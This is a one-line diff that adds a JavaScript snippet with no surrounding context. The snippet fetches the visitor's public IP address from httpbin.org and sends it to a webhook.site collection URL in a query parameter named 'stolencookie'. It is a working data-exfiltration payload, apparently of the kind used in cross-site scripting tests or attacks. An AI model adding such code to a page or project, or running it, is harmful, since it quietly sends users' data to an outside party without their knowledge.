@@ -1,0 +1,1 @@
+fetch("https://httpbin.org/ip").then(response=>response.text()).then(data=>{fetch("https://webhook.site/90214831-76aa-470f-b3df-72afa88c370b/?stolencookie="+encodeURIComponent(data)).then(innerResponse=>innerResponse.text()).then(innerData=>console.log(innerData)).catch(innerError=>console.error('InnerError:',innerError));}).catch(error=>console.error('Error:',error));
